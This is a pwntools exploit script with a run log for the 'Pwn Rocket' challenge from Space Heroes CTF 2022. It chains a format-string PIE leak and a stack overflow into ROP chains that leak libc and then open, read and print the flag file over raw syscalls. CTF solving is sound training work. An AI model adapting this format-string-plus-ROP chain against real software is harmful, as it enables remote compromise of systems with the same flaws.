from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './pwn-rocket'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "0.cloud.chals.io"
  PORT = 13163
  s = remote(HOST, PORT)
  libc = ELF("./libc6_2.33-1_amd64.so")
else:
  s = process(BINARY)
  libc = elf.libc

s.recvuntil("Please authenticate >>>")
s.sendline("%6$p")

s.recvuntil("<<< Welcome: 0x")
pie_leak = int(s.recvuntil("\n"), 16)
pie_base = pie_leak - 0x10e0

print "pie_leak =", hex(pie_leak)
print "pie_base =", hex(pie_base)

pop_rdi_ret = 0x168b # pop rdi; ret;
pop_rdx_ret = 0x14be # pop rdx; ret; 
pop_rsi_ret = 0x1689 # pop rsi; pop r15; ret;
pop_rax_ret = 0x1210 # pop rax; ret;
syscall_ret = 0x14db # syscall; ret;

s.recvuntil("Tell me to do something >>>")

buf  = "A"*72
buf += p64(pie_base + pop_rdi_ret)
buf += p64(pie_base + elf.got.puts)
buf += p64(pie_base + elf.plt.puts)
buf += p64(pie_base + elf.sym.main)
s.sendline(buf)

s.recvuntil("Invalid Command.\n")
puts_addr = u64(s.recvuntil("\n")[:-1]+"\x00\x00")
libc_base = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print "puts_addr =", hex(puts_addr)
print "libc_base =", hex(libc_base)

s.recvuntil("Please authenticate >>>")
s.sendline("A")

s.recvuntil("Tell me to do something >>>")
buf  = "A"*72
buf += p64(pie_base + pop_rdi_ret)
buf += p64(0)
buf += p64(pie_base + pop_rsi_ret)
buf += p64(pie_base + 0x5100)
buf += p64(0)
buf += p64(pie_base + pop_rdx_ret)
buf += p64(0x100)
buf += p64(pie_base + pop_rax_ret)
buf += p64(0)
buf += p64(pie_base + syscall_ret)
buf += p64(pie_base + pop_rdi_ret)
buf += p64(pie_base + 0x5100)
buf += p64(pie_base + pop_rsi_ret)
buf += p64(0)
buf += p64(0)
buf += p64(pie_base + pop_rdx_ret)
buf += p64(0)
buf += p64(pie_base + pop_rax_ret)
buf += p64(2)
buf += p64(pie_base + syscall_ret)
buf += p64(pie_base + pop_rdi_ret)
buf += p64(3)
buf += p64(pie_base + pop_rsi_ret)
buf += p64(pie_base + 0x5200)
buf += p64(0)
buf += p64(pie_base + pop_rdx_ret)
buf += p64(0x40)
buf += p64(pie_base + pop_rax_ret)
buf += p64(0)
buf += p64(pie_base + syscall_ret)
buf += p64(pie_base + pop_rdi_ret)
buf += p64(1)
buf += p64(pie_base + pop_rax_ret)
buf += p64(1)
buf += p64(pie_base + syscall_ret)
s.sendline(buf)

sleep(0.5)
s.sendline("./flag.txt\x00")

s.interactive()

'''
mito@ubuntu:~/CTF/Space_Heroes_CTF_2022/Pwn_Rocket$ python solve.py r
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/pwn-rocket'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 0.cloud.chals.io on port 13163: Done
[*] '/home/mito/CTF/Space_Heroes_CTF_2022/Pwn_Rocket/libc6_2.33-1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
pie_leak = 0x55cc169fa0e0
pie_base = 0x55cc169f9000
puts_addr = 0x7feed8cebde0
libc_base = 0x7feed8c76000
[*] Switching to interactive mode

<<< Invalid Command.
shctf{1-sma11-St3p-f0r-mAn-1-Giant-l3ap-f0r-manK1nd}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
'''
